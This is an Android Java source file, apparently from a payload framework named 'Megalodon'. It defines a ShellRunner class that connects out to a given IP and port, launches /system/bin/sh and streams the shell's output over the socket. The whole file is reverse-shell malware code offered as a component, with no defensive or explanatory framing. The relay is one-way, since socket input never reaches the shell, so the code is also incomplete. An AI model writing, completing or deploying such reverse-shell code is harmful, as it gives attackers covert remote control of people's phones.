
package com.megalodon.payload;

import android.util.Log;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class ShellRunner implements Runnable {
    private static final String TAG = "Megalodon";
    private String ip;
    private int port;
    
    public ShellRunner(String ip, int port) {
        this.ip = ip;
        this.port = port;
    }
    
    @Override
    public void run() {
        try {
            Log.d(TAG, "Connecting to " + ip + ":" + port);
            Socket socket = new Socket(ip, port);
            Log.d(TAG, "Connected!");
            
            Process p = Runtime.getRuntime().exec("/system/bin/sh");
            InputStream pin = p.getInputStream();
            OutputStream pout = p.getOutputStream();
            InputStream sin = socket.getInputStream();
            OutputStream sout = socket.getOutputStream();
            
            byte[] buf = new byte[1024];
            int len;
            while ((len = pin.read(buf)) != -1) {
                sout.write(buf, 0, len);
                sout.flush();
            }
            
            socket.close();
            p.destroy();
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }
}
